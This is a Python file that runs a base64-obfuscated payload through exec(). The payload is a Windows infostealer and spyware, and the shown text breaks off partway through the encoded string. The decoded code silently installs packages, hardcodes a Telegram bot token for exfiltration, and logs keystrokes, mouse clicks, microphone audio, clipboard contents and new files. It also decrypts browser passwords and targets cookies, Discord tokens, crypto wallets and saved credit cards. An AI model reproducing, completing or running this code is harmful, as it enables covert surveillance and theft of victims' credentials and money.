import base64, os, sys
exec(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCBzcWxpdGUzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGpzb24KaW1wb3J0IHBsYXRmb3JtCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGVtcGZpbGUKaW1wb3J0IHNodXRpbAppbXBvcnQgd2lucmVnCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzeXMKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgc29ja2V0CmltcG9ydCBnZXRwYXNzCmltcG9ydCBkYXRldGltZQppbXBvcnQgdGltZQppbXBvcnQgemlwZmlsZQppbXBvcnQgaW8KaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZnJvbSBjb2xsZWN0aW9ucyBpbXBvcnQgZGVmYXVsdGRpY3QKCiMg0KPRgdGC0LDQvdC+0LLQutCwINC30LDQstC40YHQuNC80L7RgdGC0LXQuQpkZWYgaW5zdGFsbF9kZXBzKCk6CiAgICBwYWNrYWdlcyA9IFsicmVxdWVzdHMiLCAicHljcnlwdG9kb21lIiwgImJyb3dzZXItY29va2llMyIsICJweXdpbjMyIiwgInBpbGxvdyIsICJweW5wdXQiLCAicHlhdWRpbyIsICJvcGVuY3YtcHl0aG9uIiwgIm51bXB5IiwgInBzdXRpbCJdCiAgICBmb3IgcGFja2FnZSBpbiBwYWNrYWdlczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIHBhY2thZ2UgPT0gInB5d2luMzIiOiBfX2ltcG9ydF9fKCJ3aW4zMmNyeXB0IikKICAgICAgICAgICAgZWxpZiBwYWNrYWdlID09ICJwaWxsb3ciOiBfX2ltcG9ydF9fKCJQSUwiKQogICAgICAgICAgICBlbGlmIHBhY2thZ2UgPT0gImJyb3dzZXItY29va2llMyI6IF9faW1wb3J0X18oImJyb3dzZXJfY29va2llMyIpCiAgICAgICAgICAgIGVsaWYgcGFja2FnZSA9PSAicHlucHV0IjogX19pbXBvcnRfXygicHlucHV0IikKICAgICAgICAgICAgZWxpZiBwYWNrYWdlID09ICJweWF1ZGlvIjogX19pbXBvcnRfXygicHlhdWRpbyIpCiAgICAgICAgICAgIGVsaWYgcGFja2FnZSA9PSAib3BlbmN2LXB5dGhvbiI6IF9faW1wb3J0X18oImN2MiIpCiAgICAgICAgICAgIGVsaWYgcGFja2FnZSA9PSAicHN1dGlsIjogX19pbXBvcnRfXygicHN1dGlsIikKICAgICAgICAgICAgZWxzZTogX19pbXBvcnRfXyhwYWNrYWdlKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jaGVja19jYWxsKFtzeXMuZXhlY3V0YWJsZSwgIi1tIiwgInBpcCIsICJpbnN0YWxsIiwgcGFja2FnZSwgIi0tdXNlciIsICItLXF1aWV0Il0sIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKCmluc3RhbGxfZGVwcygpCgojINCY0LzQv9C+0YDRgtGLINC/0L7RgdC70LUg0YPRgdGC0LDQvdC+0LLQutC4CmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCmZyb20gQ3J5cHRvLlV0aWwuUGFkZGluZyBpbXBvcnQgdW5wYWQKaW1wb3J0IHdpbjMyY3J5cHQKaW1wb3J0IGJyb3dzZXJfY29va2llMwpmcm9tIFBJTCBpbXBvcnQgSW1hZ2VHcmFiCmZyb20gcHlucHV0IGltcG9ydCBrZXlib2FyZCwgbW91c2UKaW1wb3J0IHB5YXVkaW8KaW1wb3J0IHdhdmUKaW1wb3J0IGN2MgppbXBvcnQgbnVtcHkgYXMgbnAKaW1wb3J0IHBzdXRpbAoKVEVMRUdSQU1fQk9UX1RPS0VOID0gIjgyNDE4MDA5NTE6QUFGTDFaQ2RydVhuUGctMFkwOXBsQXBoR0hFV0x0d0JjbTQiClRFTEVHUkFNX0NIQVRfSUQgPSAiNzc0NTkyNTY4NiIKCiMg0JPQu9C+0LHQsNC70YzQvdGL0LUg0L/QtdGA0LXQvNC10L3QvdGL0LUKa2V5bG9nZ2VyX2FjdGl2ZSA9IEZhbHNlCmF1ZGlvX3JlY29yZGluZ19hY3RpdmUgPSBGYWxzZQpjbGlwYm9hcmRfbW9uaXRvcl9hY3RpdmUgPSBGYWxzZQpmaWxlX21vbml0b3JfYWN0aXZlID0gRmFsc2UKbW91c2VfbW9uaXRvcl9hY3RpdmUgPSBGYWxzZQpzY3JlZW5fbG9ja2VkID0gRmFsc2UKCmNsYXNzIEtleUxvZ2dlcjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKTogCiAgICAgICAgc2VsZi5sb2cgPSAiIgogICAgICAgIHNlbGYubGlzdGVuZXIgPSBOb25lCiAgICAgICAgc2VsZi5zcGVjaWFsX2tleXMgPSB7CiAgICAgICAgICAgICJLZXkuc3BhY2UiOiAiICIsICJLZXkuZW50ZXIiOiAiW0VOVEVSXVxcbiIsICJLZXkuYmFja3NwYWNlIjogIltCQUNLU1BBQ0VdIiwKICAgICAgICAgICAgIktleS50YWIiOiAiW1RBQl0iLCAiS2V5LmVzYyI6ICJbRVNDXSIsICJLZXkuc2hpZnQiOiAiW1NISUZUXSIsCiAgICAgICAgICAgICJLZXkuY3RybF9sIjogIltDVFJMXSIsICJLZXkuYWx0X2wiOiAiW0FMVF0iLCAiS2V5LmNhcHNfbG9jayI6ICJbQ0FQU10iCiAgICAgICAgfQogICAgCiAgICBkZWYgb25fcHJlc3Moc2VsZiwga2V5KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGtleV9zdHIgPSBzdHIoa2V5KQogICAgICAgICAgICBpZiBrZXlfc3RyIGluIHNlbGYuc3BlY2lhbF9rZXlzOgogICAgICAgICAgICAgICAgc2VsZi5sb2cgKz0gc2VsZi5zcGVjaWFsX2tleXNba2V5X3N0cl0KICAgICAgICAgICAgZWxpZiBoYXNhdHRyKGtleSwgJ2NoYXInKSBhbmQga2V5LmNoYXI6CiAgICAgICAgICAgICAgICBzZWxmLmxvZyArPSBrZXkuY2hhcgogICAgICAgICAgICAKICAgICAgICAgICAgaWYgbGVuKHNlbGYubG9nKSA+IDIwMDoKICAgICAgICAgICAgICAgIHNlbGYuc2F2ZV9sb2coKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgCiAgICBkZWYgc2F2ZV9sb2coc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImtleWxvZy50eHQiKSwgImEiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShmIlt7ZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCl9XSB7c2VsZi5sb2d9IikKICAgICAgICAgICAgICAgIHNlbGYubG9nID0gIiIKICAgICAgICBleGNlcHQ6IHBhc3MKICAgIAogICAgZGVmIHN0YXJ0KHNlbGYpOgogICAgICAgIHRyeTogCiAgICAgICAgICAgIHNlbGYubGlzdGVuZXIgPSBrZXlib2FyZC5MaXN0ZW5lcihvbl9wcmVzcz1zZWxmLm9uX3ByZXNzKQogICAgICAgICAgICBzZWxmLmxpc3RlbmVyLnN0YXJ0KCkKICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICBleGNlcHQ6IHJldHVybiBGYWxzZQogICAgCiAgICBkZWYgc3RvcChzZWxmKToKICAgICAgICBpZiBzZWxmLmxpc3RlbmVyOiAKICAgICAgICAgICAgc2VsZi5saXN0ZW5lci5zdG9wKCkKICAgICAgICBzZWxmLnNhdmVfbG9nKCkKCmNsYXNzIE1vdXNlTG9nZ2VyOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuYWN0aW9ucyA9IFtdCiAgICAgICAgc2VsZi5saXN0ZW5lciA9IE5vbmUKICAgIAogICAgZGVmIG9uX2NsaWNrKHNlbGYsIHgsIHksIGJ1dHRvbiwgcHJlc3NlZCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBhY3Rpb24gPSAiQ0xJQ0siIGlmIHByZXNzZWQgZWxzZSAiUkVMRUFTRSIKICAgICAgICAgICAgc2VsZi5hY3Rpb25zLmFwcGVuZChmIlt7ZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCl9XSB7YWN0aW9ufSBhdCAoe3h9LCB7eX0pIHdpdGgge2J1dHRvbn0iKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgbGVuKHNlbGYuYWN0aW9ucykgPiA1MDoKICAgICAgICAgICAgICAgIHNlbGYuc2F2ZV9hY3Rpb25zKCkKICAgICAgICBleGNlcHQ6IHBhc3MKICAgIAogICAgZGVmIHNhdmVfYWN0aW9ucyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4odGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAibW91c2Vsb2cudHh0IiksICJhIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoIlxcbiIuam9pbihzZWxmLmFjdGlvbnMpICsgIlxcbiIpCiAgICAgICAgICAgICAgICBzZWxmLmFjdGlvbnMgPSBbXQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgCiAgICBkZWYgc3RhcnQoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLmxpc3RlbmVyID0gbW91c2UuTGlzdGVuZXIob25fY2xpY2s9c2VsZi5vbl9jbGljaykKICAgICAgICAgICAgc2VsZi5saXN0ZW5lci5zdGFydCgpCiAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgZXhjZXB0OiByZXR1cm4gRmFsc2UKICAgIAogICAgZGVmIHN0b3Aoc2VsZik6CiAgICAgICAgaWYgc2VsZi5saXN0ZW5lcjoKICAgICAgICAgICAgc2VsZi5saXN0ZW5lci5zdG9wKCkKICAgICAgICBzZWxmLnNhdmVfYWN0aW9ucygpCgpjbGFzcyBBdWRpb1JlY29yZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOiAKICAgICAgICBzZWxmLnJlY29yZGluZyA9IEZhbHNlCiAgICAgICAgc2VsZi5mcmFtZXMgPSBbXQogICAgCiAgICBkZWYgcmVjb3JkX2F1ZGlvKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgQ0hVTksgPSAxMDI0CiAgICAgICAgICAgIEZPUk1BVCA9IHB5YXVkaW8ucGFJbnQxNgogICAgICAgICAgICBDSEFOTkVMUyA9IDIKICAgICAgICAgICAgUkFURSA9IDQ0MTAwCiAgICAgICAgICAgIAogICAgICAgICAgICBwID0gcHlhdWRpby5QeUF1ZGlvKCkKICAgICAgICAgICAgc3RyZWFtID0gcC5vcGVuKGZvcm1hdD1GT1JNQVQsIGNoYW5uZWxzPUNIQU5ORUxTLCByYXRlPVJBVEUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgaW5wdXQ9VHJ1ZSwgZnJhbWVzX3Blcl9idWZmZXI9Q0hVTkspCiAgICAgICAgICAgIAogICAgICAgICAgICBzZWxmLmZyYW1lcyA9IFtdCiAgICAgICAgICAgIHNlbGYucmVjb3JkaW5nID0gVHJ1ZQogICAgICAgICAgICAKICAgICAgICAgICAgd2hpbGUgc2VsZi5yZWNvcmRpbmc6CiAgICAgICAgICAgICAgICBkYXRhID0gc3RyZWFtLnJlYWQoQ0hVTkspCiAgICAgICAgICAgICAgICBzZWxmLmZyYW1lcy5hcHBlbmQoZGF0YSkKICAgICAgICAgICAgCiAgICAgICAgICAgIHN0cmVhbS5zdG9wX3N0cmVhbSgpCiAgICAgICAgICAgIHN0cmVhbS5jbG9zZSgpCiAgICAgICAgICAgIHAudGVybWluYXRlKCkKICAgICAgICAgICAgc2VsZi5zYXZlX3JlY29yZGluZygpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAKICAgIGRlZiBzYXZlX3JlY29yZGluZyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbih0ZW1wZmlsZS5nZXR0ZW1wZGlyKCksICJhdWRpb19yZWNvcmQud2F2IikKICAgICAgICAgICAgd2YgPSB3YXZlLm9wZW4oZmlsZV9wYXRoLCAnd2InKQogICAgICAgICAgICB3Zi5zZXRuY2hhbm5lbHMoMikKICAgICAgICAgICAgd2Yuc2V0c2FtcHdpZHRoKDIpCiAgICAgICAgICAgIHdmLnNldGZyYW1lcmF0ZSg0NDEwMCkKICAgICAgICAgICAgd2Yud3JpdGVmcmFtZXMoYicnLmpvaW4oc2VsZi5mcmFtZXMpKQogICAgICAgICAgICB3Zi5jbG9zZSgpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAKICAgIGRlZiBzdGFydChzZWxmKToKICAgICAgICBzZWxmLnJlY29yZGluZyA9IFRydWUKICAgICAgICBzZWxmLnJlY29yZF90aHJlYWQgPSBUaHJlYWQodGFyZ2V0PXNlbGYucmVjb3JkX2F1ZGlvKQogICAgICAgIHNlbGYucmVjb3JkX3RocmVhZC5kYWVtb24gPSBUcnVlCiAgICAgICAgc2VsZi5yZWNvcmRfdGhyZWFkLnN0YXJ0KCkKICAgIAogICAgZGVmIHN0b3Aoc2VsZik6IAogICAgICAgIHNlbGYucmVjb3JkaW5nID0gRmFsc2UKCmNsYXNzIENsaXBib2FyZFN0ZWFsZXI6CiAgICBkZWYgX19pbml0X18oc2VsZik6IAogICAgICAgIHNlbGYubGFzdF9jbGlwYm9hcmQgPSAiIgogICAgICAgIHNlbGYucnVubmluZyA9IEZhbHNlCiAgICAKICAgIGRlZiBtb25pdG9yX2NsaXBib2FyZChzZWxmKToKICAgICAgICBpbXBvcnQgd2luMzJjbGlwYm9hcmQKICAgICAgICBzZWxmLnJ1bm5pbmcgPSBUcnVlCiAgICAgICAgd2hpbGUgc2VsZi5ydW5uaW5nOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB3aW4zMmNsaXBib2FyZC5PcGVuQ2xpcGJvYXJkKCkKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBkYXRhID0gd2luMzJjbGlwYm9hcmQuR2V0Q2xpcGJvYXJkRGF0YSgpCiAgICAgICAgICAgICAgICAgICAgaWYgZGF0YSBhbmQgZGF0YSAhPSBzZWxmLmxhc3RfY2xpcGJvYXJkOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmxhc3RfY2xpcGJvYXJkID0gZGF0YQogICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImNsaXBib2FyZC50eHQiKSwgImEiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmIlt7ZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCl9XSB7ZGF0YX1cXG4iKQogICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgICAgICAgICB3aW4zMmNsaXBib2FyZC5DbG9zZUNsaXBib2FyZCgpCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAKICAgIGRlZiBzdGFydChzZWxmKToKICAgICAgICBzZWxmLnJ1bm5pbmcgPSBUcnVlCiAgICAgICAgc2VsZi5jbGlwYm9hcmRfdGhyZWFkID0gVGhyZWFkKHRhcmdldD1zZWxmLm1vbml0b3JfY2xpcGJvYXJkKQogICAgICAgIHNlbGYuY2xpcGJvYXJkX3RocmVhZC5kYWVtb24gPSBUcnVlCiAgICAgICAgc2VsZi5jbGlwYm9hcmRfdGhyZWFkLnN0YXJ0KCkKICAgIAogICAgZGVmIHN0b3Aoc2VsZik6IAogICAgICAgIHNlbGYucnVubmluZyA9IEZhbHNlCgpjbGFzcyBGaWxlTW9uaXRvcjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKTogCiAgICAgICAgc2VsZi5ydW5uaW5nID0gRmFsc2UKICAgICAgICBzZWxmLmtub3duX2ZpbGVzID0gZGVmYXVsdGRpY3Qoc2V0KQogICAgCiAgICBkZWYgbW9uaXRvcl9kaXJlY3RvcmllcyhzZWxmKToKICAgICAgICBzZWxmLnJ1bm5pbmcgPSBUcnVlCiAgICAgICAgbW9uaXRvcl9wYXRocyA9IFsKICAgICAgICAgICAgb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICJEb3dubG9hZHMiKSwKICAgICAgICAgICAgb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICJEZXNrdG9wIiksCiAgICAgICAgICAgIG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAiRG9jdW1lbnRzIiksCiAgICAgICAgXQogICAgICAgIAogICAgICAgICMg0JjQvdC40YbQuNCw0LvQuNC30LDRhtC40Y8g0LjQt9Cy0LXRgdGC0L3Ri9GFINGE0LDQudC70L7QsgogICAgICAgIGZvciBwYXRoIGluIG1vbml0b3JfcGF0aHM6CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgc2VsZi5rbm93bl9maWxlc1twYXRoXSA9IHNldChvcy5saXN0ZGlyKHBhdGgpKQogICAgICAgIAogICAgICAgIHdoaWxlIHNlbGYucnVubmluZzoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZm9yIHBhdGggaW4gbW9uaXRvcl9wYXRoczoKICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudF9maWxlcyA9IHNldChvcy5saXN0ZGlyKHBhdGgpKQogICAgICAgICAgICAgICAgICAgICAgICBuZXdfZmlsZXMgPSBjdXJyZW50X2ZpbGVzIC0gc2VsZi5rbm93bl9maWxlc1twYXRoXQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gbmV3X2ZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHBhdGgsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShmaWxlX3BhdGgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaW5mbyA9IGYiW3tkYXRldGltZS5kYXRldGltZS5ub3coKX1dINCd0J7QktCr0Jkg0KTQkNCZ0Js6IHtmaWxlfSB8INCf0YPRgtGMOiB7ZmlsZV9wYXRofSB8INCg0LDQt9C80LXRgDoge29zLnBhdGguZ2V0c2l6ZShmaWxlX3BhdGgpfSDQsdCw0LnRgiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImZpbGVfbW9uaXRvci50eHQiKSwgImEiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGZpbGVfaW5mbyArICJcXG4iKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5rbm93bl9maWxlc1twYXRoXSA9IGN1cnJlbnRfZmlsZXMKICAgICAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkKICAgIAogICAgZGVmIHN0YXJ0KHNlbGYpOgogICAgICAgIHNlbGYucnVubmluZyA9IFRydWUKICAgICAgICBzZWxmLm1vbml0b3JfdGhyZWFkID0gVGhyZWFkKHRhcmdldD1zZWxmLm1vbml0b3JfZGlyZWN0b3JpZXMpCiAgICAgICAgc2VsZi5tb25pdG9yX3RocmVhZC5kYWVtb24gPSBUcnVlCiAgICAgICAgc2VsZi5tb25pdG9yX3RocmVhZC5zdGFydCgpCiAgICAKICAgIGRlZiBzdG9wKHNlbGYpOiAKICAgICAgICBzZWxmLnJ1bm5pbmcgPSBGYWxzZQoKY2xhc3MgU2NyZWVuTG9ja2VyOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYubG9ja2VkID0gRmFsc2UKICAgIAogICAgZGVmIGxvY2tfc2NyZWVuKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gIldpbmRvd3MiOgogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJydW5kbGwzMi5leGUgdXNlcjMyLmRsbCxMb2NrV29ya1N0YXRpb24iKQogICAgICAgICAgICAgICAgc2VsZi5sb2NrZWQgPSBUcnVlCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQoKY2xhc3MgUHJvY2Vzc01hbmFnZXI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgcGFzcwogICAgCiAgICBkZWYga2lsbF9wcm9jZXNzX2J5X25hbWUoc2VsZiwgcHJvY2Vzc19uYW1lKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICJXaW5kb3dzIjoKICAgICAgICAgICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKGYidGFza2tpbGwgL2YgL2ltIHtwcm9jZXNzX25hbWV9Iiwgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlKQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdC5yZXR1cm5jb2RlID09IDAKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKGYicGtpbGwgLWYge3Byb2Nlc3NfbmFtZX0iLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUpCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0LnJldHVybmNvZGUgPT0gMAogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAKICAgIGRlZiBraWxsX3Byb2Nlc3NfYnlfcGlkKHNlbGYsIHBpZCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBwbGF0Zm9ybS5zeXN0ZW0oKSA9PSAiV2luZG93cyI6CiAgICAgICAgICAgICAgICByZXN1bHQgPSBzdWJwcm9jZXNzLnJ1bihmInRhc2traWxsIC9mIC9waWQge3BpZH0iLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUpCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0LnJldHVybmNvZGUgPT0gMAogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5ydW4oZiJraWxsIC05IHtwaWR9Iiwgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlKQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdC5yZXR1cm5jb2RlID09IDAKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICBkZWYgZ2V0X2FjdGl2ZV93aW5kb3dfcHJvY2VzcyhzZWxmKToKICAgICAgICAiIiLQn9C+0LvRg9GH0LDQtdGCINC/0YDQvtGG0LXRgdGBINCw0LrRgtC40LLQvdC+0LPQviDQvtC60L3QsCIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gIldpbmRvd3MiOgogICAgICAgICAgICAgICAgaW1wb3J0IGN0eXBlcwogICAgICAgICAgICAgICAgZnJvbSBjdHlwZXMgaW1wb3J0IHdpbnR5cGVzCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGh3bmQgPSBjdHlwZXMud2luZGxsLnVzZXIzMi5HZXRGb3JlZ3JvdW5kV2luZG93KCkKICAgICAgICAgICAgICAgIHBpZCA9IHdpbnR5cGVzLkRXT1JEKCkKICAgICAgICAgICAgICAgIGN0eXBlcy53aW5kbGwudXNlcjMyLkdldFdpbmRvd1RocmVhZFByb2Nlc3NJZChod25kLCBjdHlwZXMuYnlyZWYocGlkKSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIyDQn9C+0LvRg9GH0LDQtdC8INC40LzRjyDQv9GA0L7RhtC10YHRgdCwINC/0L4gUElECiAgICAgICAgICAgICAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKFsncGlkJywgJ25hbWUnXSk6CiAgICAgICAgICAgICAgICAgICAgaWYgcHJvYy5pbmZvWydwaWQnXSA9PSBwaWQudmFsdWU6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBwcm9jLmluZm9bJ25hbWUnXSwgcGlkLnZhbHVlCiAgICAgICAgICAgIHJldHVybiBOb25lLCBOb25lCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICByZXR1cm4gTm9uZSwgTm9uZQogICAgCiAgICBkZWYgZ2V0X3J1bm5pbmdfcHJvY2Vzc2VzKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcHJvY2Vzc2VzID0gW10KICAgICAgICAgICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcihbJ3BpZCcsICduYW1lJywgJ21lbW9yeV9wZXJjZW50JywgJ2NwdV9wZXJjZW50J10pOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHByb2Nlc3Nlcy5hcHBlbmQocHJvYy5pbmZvKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgcmV0dXJuIHByb2Nlc3NlcwogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcmV0dXJuIFtdCgpjbGFzcyBBZHZhbmNlZFN0ZWFsZXI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gewogICAgICAgICAgICAicGFzc3dvcmRzIjogW10sICJjb29raWVzIjogW10sICJzY3JlZW5zaG90cyI6IFtdLCAic3lzdGVtX2luZm8iOiB7fSwgCiAgICAgICAgICAgICJ3aWZpX3Bhc3N3b3JkcyI6IFtdLCAidGVsZWdyYW1fc2Vzc2lvbnMiOiBbXSwgImRpc2NvcmRfdG9rZW5zIjogW10sIAogICAgICAgICAgICAic3RlYW1fZGF0YSI6IFtdLCAiZmlsZXppbGxhX2RhdGEiOiBbXSwgIm1ldGFtYXNrX2RhdGEiOiBbXSwgImNyeXB0b193YWxsZXRzIjogW10sCiAgICAgICAgICAgICJicm93c2VyX2hpc3RvcnkiOiBbXSwgInNhdmVkX2NyZWRpdF9jYXJkcyI6IFtdLCAiYXV0b2ZpbGxfZGF0YSI6IFtdCiAgICAgICAgfQogICAgCiAgICBkZWYgZ2V0X21hc3Rlcl9rZXkoc2VsZiwgYnJvd3Nlcl9wYXRoKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oYnJvd3Nlcl9wYXRoLCAiTG9jYWwgU3RhdGUiKSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOgogICAgICAgICAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWQoZikKICAgICAgICAgICAgbWFzdGVyX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSlbNTpdCiAgICAgICAgICAgIHJldHVybiB3aW4zMmNyeXB0LkNyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQogICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgIHJldHVybiBOb25lCgogICAgZGVmIGRlY3J5cHRfcGFzc3dvcmQoc2VsZiwgYnVmZiwgbWFzdGVyX2tleSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0KICAgICAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgICAgIHJldHVybiBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKVs6LTE2XS5kZWNvZGUoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgdHJ5OiAKICAgICAgICAgICAgICAgIHJldHVybiBzdHIod2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEoYnVmZiwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0pCiAgICAgICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgICAgICByZX